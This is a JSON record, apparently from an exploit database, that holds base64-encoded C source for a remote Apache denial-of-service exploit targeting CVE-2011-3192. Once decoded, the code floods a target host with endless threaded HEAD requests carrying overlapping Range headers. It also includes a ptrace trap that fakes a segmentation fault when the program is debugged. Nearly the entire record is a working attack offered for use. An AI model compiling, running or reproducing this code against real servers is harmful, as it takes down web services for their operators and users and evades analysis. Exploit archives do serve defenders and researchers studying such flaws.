{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIFRoaXMgaXMgYSByZXZlcnNlIGVuZ2luZWVyZWQgdmVyc2lvbiBvZiB0aGUgZXhwbG9pdCBmb3IgQ1ZFLTIwMTEtMzE5MiBtYWRlDQogKiBieSBldjFsdXQxMG4gKGh0dHA6Ly9qYXlha29uc3RydWtzaS5jb20vYmFja3VwaW50c2VjL3JhcGFjaGUudGd6KS4NCiAqIENvcHlyaWdodCAyMDExIFJhbW9uIGRlIEMgVmFsbGUgPHJjdmFsbGVAcmVkaGF0LmNvbT4NCiAqDQogKiBDb21waWxlIHdpdGggdGhlIGZvbGxvd2luZyBjb21tYW5kOg0KICogZ2NjIC1XYWxsIC1wdGhyZWFkIC1vIHJjdmFsbGUtcmFwYWNoZSByY3ZhbGxlLXJhcGFjaGUuYw0KICovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN5cy9wdHJhY2UuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxwdGhyZWFkLmg+DQoNCnZvaWQgcHRyYWNlX3RyYXAodm9pZCkgX19hdHRyaWJ1dGVfXyAoKGNvbnN0cnVjdG9yKSk7DQoNCnZvaWQNCnB0cmFjZV90cmFwKHZvaWQpIHsNCiAgICBpZiAocHRyYWNlKFBUUkFDRV9UUkFDRU1FLCAwLCAwLCAwKSA8IDApIHsNCiAgICAgICAgd3JpdGUoZmlsZW5vKHN0ZG91dCksICJTZWdtZW50YXRpb24gZmF1bHRcbiIsIDE5KTsNCiAgICAgICAgZXhpdCgtMSk7DQogICAgfQ0KfQ0KDQp2b2lkDQp3NHJuNDFkdW4xNG11KGludCBhdHRyLCBpbnQgZmcsIGludCBiZykNCnsNCiAgICBjaGFyIGNvbW1hbmRbMTNdOw0KDQogICAgc3ByaW50Zihjb21tYW5kLCAiJWNbJWQ7JWQ7JWRtIiwgMHgxYiwgYXR0ciwgZmcrMzAsIGJnKzQwKTsNCiAgICBwcmludGYoIiVzIiwgY29tbWFuZCk7DQp9DQoNCnZvaWQNCmJhbm5lcigpDQp7DQogICAgdzRybjQxZHVuMTRtdSgwLCAxLCAwKTsNCiAgICBmd3JpdGUoIlJlbW90ZSBBcGFjaGUgRGVuaWFsIG9mIFNlcnZpY2UgRXhwbG9pdCBieSBldjFsdXQxMG5cbiIsIDUzLCAxLA0KICAgICAgICAgICBzdGRvdXQpOw0KfQ0KDQp2b2lkDQpnaW1lX2VyX21hcygpDQp7DQogICAgcHJpbnRmKCIlYyVzIiwgMHgxYiwgIlsySiIpOw0KICAgIHByaW50ZigiJWMlcyIsIDB4MWIsICJbMTsxSCIpOw0KICAgIHB1dHMoIlxuc29ycnkgZHVkZSB0aGVyZSdzIGFuIGVycm9yLi4uIik7DQp9DQoNCnN0cnVjdCB0aHJlYWRfaW5mbyB7DQogICAgcHRocmVhZF90IHRocmVhZF9pZDsNCiAgICBpbnQgICAgICAgdGhyZWFkX251bTsNCiAgICBjaGFyICAgICAqYXJndl9zdHJpbmc7DQp9Ow0KDQpzdGF0aWMgdm9pZCAqDQp0aHJlYWRfc3RhcnQodm9pZCAqYXJnKQ0Kew0KICAgIHN0cnVjdCB0aHJlYWRfaW5mbyAqdGluZm8gPSAoc3RydWN0IHRocmVhZF9pbmZvICopIGFyZzsNCiAgICBjaGFyIGhvc3RuYW1lWzY0XTsNCiAgICBpbnQgajsNCg0KICAgIHN0cmNweShob3N0bmFtZSwgdGluZm8tPmFyZ3Zfc3RyaW5nKTsNCg0KICAgIGogPSAwOw0KICAgIHdoaWxlIChqICE9IDEwKSB7DQogICAgICAgIHN0cnVjdCBhZGRyaW5mbyBoaW50czsNCiAgICAgICAgc3RydWN0IGFkZHJpbmZvICpyZXN1bHQsICpycDsNCiAgICAgICAgaW50IHNmZCwgczsNCiAgICAgICAgc3NpemVfdCBud3JpdHRlbjsNCg0KICAgICAgICBtZW1zZXQoJmhpbnRzLCAwLCBzaXplb2Yoc3RydWN0IGFkZHJpbmZvKSk7DQogICAgICAgIGhpbnRzLmFpX2ZhbWlseSA9IEFGX1VOU1BFQzsNCiAgICAgICAgaGludHMuYWlfc29ja3R5cGUgPSBTT0NLX1NUUkVBTTsNCiAgICAgICAgaGludHMuYWlfZmxhZ3MgPSAwOw0KICAgICAgICBoaW50cy5haV9wcm90b2NvbCA9IDA7DQoNCiAgICAgICAgcyA9IGdldGFkZHJpbmZvKGhvc3RuYW1lLCAiaHR0cCIsICZoaW50cywgJnJlc3VsdCk7DQogICAgICAgIGlmIChzICE9IDApIHsNCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiZ2V0YWRkcmluZm86ICVzXG4iLCBnYWlfc3RyZXJyb3IocykpOw0KICAgICAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOw0KICAgICAgICB9DQoNCiAgICAgICAgZm9yIChycCA9IHJlc3VsdDsgcnAgIT0gTlVMTDsgcnAgPSBycC0+YWlfbmV4dCkgew0KICAgICAgICAgICAgc2ZkID0gc29ja2V0KHJwLT5haV9mYW1pbHksIHJwLT5haV9zb2NrdHlwZSwgcnAtPmFpX3Byb3RvY29sKTsNCiAgICAgICAgICAgIGlmIChzZmQgPT0gLTEpDQogICAgICAgICAgICAgICAgY29udGludWU7DQoNCiAgICAgICAgICAgIGlmIChjb25uZWN0KHNmZCwgcnAtPmFpX2FkZHIsIHJwLT5haV9hZGRybGVuKSA9PSAtMSkNCiAgICAgICAgICAgICAgICBjbG9zZShzZmQpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHJlc3VsdCAhPSBOVUxMKQ0KICAgICAgICAgICAgZnJlZWFkZHJpbmZvKHJlc3VsdCk7DQoNCiAgICAgICAgbndyaXR0ZW4gPSB3cml0ZShzZmQsICJIRUFEIC8gSFRUUC8xLjFcbiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJIb3N0OmxvY2FsaG9zdFxuIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJhbmdlOmJ5dGVzPTAtLDAtXG4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nOiBnemlwIiwgNzEpOw0KICAgICAgICBpZiAobndyaXR0ZW4gPT0gLTEpDQogICAgICAgICAgICBjbG9zZShzZmQpOw0KDQogICAgICAgIHVzbGVlcCgzMDAwMDApOw0KDQogICAgICAgIGorKzsNCiAgICB9DQoNCiAgICByZXR1cm4gMDsNCn0NCg0KaW50DQptYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogICAgaW50IGk7DQogICAgc3RydWN0IHRocmVhZF9pbmZvIHRpbmZvOw0KDQogICAgYmFubmVyKCk7DQoNCiAgICBpZiAoYXJnYyA8PSAxKSB7DQogICAgICAgIHc0cm40MWR1bjE0bXUoMCwgMiwgMCk7DQogICAgICAgIGZ3cml0ZSgiXG5bLV0gVXNhZ2UgOiAuL3JhcGFjaGUgaG9zdG5hbWVcbiIsIDMyLCAxLCBzdGRvdXQpOw0KICAgICAgICByZXR1cm4gMDsNCiAgICB9DQoNCiAgICB3NHJuNDFkdW4xNG11KDAsIDMsIDApOw0KICAgIHByaW50ZigiWytdIEF0dGFja2luZyAlcyBwbGVhc2Ugd2FpdCAgaW4gbWludXRlcyAuLi5cbiIsIGFyZ3ZbMV0pOw0KDQogICAgd2hpbGUgKDEpIHsNCiAgICAgICAgaSA9IDA7DQogICAgICAgIHdoaWxlIChpICE9IDUwKSB7DQogICAgICAgICAgICB0aW5mby50aHJlYWRfbnVtID0gaTsNCiAgICAgICAgICAgIHRpbmZvLmFyZ3Zfc3RyaW5nID0gYXJndlsxXTsNCg0KICAgICAgICAgICAgcHRocmVhZF9jcmVhdGUoJnRpbmZvLnRocmVhZF9pZCwgTlVMTCwgJnRocmVhZF9zdGFydCwgJnRpbmZvKTsNCg0KICAgICAgICAgICAgdXNsZWVwKDUwMDAwMCk7DQoNCiAgICAgICAgICAgIGkrKzsNCiAgICAgICAgfQ0KICAgIH0NCn0=", 
    "filename": "platforms/linux/dos/18221.c", 
    "id": "18221", 
    "cves": [
        "CVE-2011-3192"
    ]
}